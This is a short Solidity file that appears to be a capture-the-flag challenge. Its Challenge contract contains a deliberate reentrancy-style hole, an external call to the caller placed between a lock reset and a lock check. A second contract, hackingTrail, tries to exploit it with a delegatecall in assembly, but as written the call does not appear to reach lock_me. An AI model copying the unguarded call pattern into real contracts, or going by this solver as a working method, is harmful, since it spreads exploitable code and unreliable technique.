pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}

contract hackingTrail {

    address public constant challengeAddr = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;

    receive() external payable {
        assembly {
            let check := delegatecall(gas(),challengeAddr,0,0,0,0)
            if eq(check, 0) {
                revert(0, returndatasize())
            }
        }
    }
}

